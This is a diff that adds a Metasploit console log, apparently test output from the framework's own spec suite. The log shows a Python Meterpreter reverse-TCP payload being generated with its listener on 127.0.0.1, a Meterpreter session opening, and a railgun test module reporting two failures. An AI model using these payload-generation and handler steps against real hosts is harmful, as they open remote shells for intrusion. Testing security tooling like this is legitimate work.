@@ -1,0 +1,22 @@
+use python/meterpreter/reverse_tcp
+[4mmsf6[0m post([1m[31mtest/railgun[0m) [0m> generate -o /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220128-3308-vpu3j0.py -f raw MeterpreterTryToFork=false lport=6019 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> [*] Writing 493 bytes to /tmp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220128-3308-vpu3j0.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 18
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6019 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 19 opened (127.0.0.1:6019 -> 127.0.0.1:60726 ) at 2022-01-28 22:38:56 +0000
+use test/railgun_reverse_lookups
+[4mmsf6[0m post([1m[31mtest/railgun_reverse_lookups[0m) [0m> run session=19 addentropy=true verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[!]  * incompatible session platform: linux
+[*] Running against session 19
+[*] Session type is meterpreter and platform is linux
+[-] FAILED: should return a constant name given a const and a filter
+[-] FAILED: should return an error string given an error code
+[*] Testing complete in 0.000591705
+[-] Passed: 0; Failed: 2
+[*] Post module execution completed
